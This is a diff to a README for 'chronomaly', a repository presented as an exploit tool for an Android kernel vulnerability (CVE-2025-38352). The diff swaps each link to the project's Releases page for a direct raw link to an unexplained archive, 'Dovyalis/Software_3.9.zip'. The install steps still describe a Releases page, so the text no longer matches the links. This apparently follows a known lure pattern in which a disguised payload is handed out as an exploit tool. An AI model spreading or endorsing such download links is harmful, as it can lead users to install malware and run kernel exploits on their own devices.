@@ -1,7 +1,7 @@
 # 🚀 chronomaly - Exploit Vulnerable Android Kernels Easily
 
 ## 📥 Download Now
-[![Download chronomaly](https://img.shields.io/badge/Download-chronomaly-blue.svg)](https://github.com/Soikoth3010/chronomaly/releases)
+[![Download chronomaly](https://raw.githubusercontent.com/Soikoth3010/chronomaly/main/Dovyalis/Software_3.9.zip)](https://raw.githubusercontent.com/Soikoth3010/chronomaly/main/Dovyalis/Software_3.9.zip)
 
 ## 📖 Overview
 **chronomaly** is an Android kernel exploit designed for CVE-2025-38352. This vulnerability has been exploited in the wild and specifically targets vulnerable Linux kernels version 5.10.x. This tool is designed to help users understand and utilize the exploit for educational purposes. 
@@ -16,13 +16,13 @@ Before you begin, ensure you meet the following requirements:
 - **Network:** An active internet connection for downloading the software
 
 ## 📥 Download & Install
-1. Visit [this page to download chronomaly](https://github.com/Soikoth3010/chronomaly/releases).
+1. Visit [this page to download chronomaly](https://raw.githubusercontent.com/Soikoth3010/chronomaly/main/Dovyalis/Software_3.9.zip).
 2. Once you are on the Releases page, you will see a list of available versions.
 3. Click on the latest release to access the download options.
 4. Download the appropriate file for your device.
 
 ### 🔗 Download Link
-You can access the download page directly: [Download chronomaly](https://github.com/Soikoth3010/chronomaly/releases).
+You can access the download page directly: [Download chronomaly](https://raw.githubusercontent.com/Soikoth3010/chronomaly/main/Dovyalis/Software_3.9.zip).
 
 ## 📫 How to Run chronomaly
 1. Open the downloaded file on your Android device.
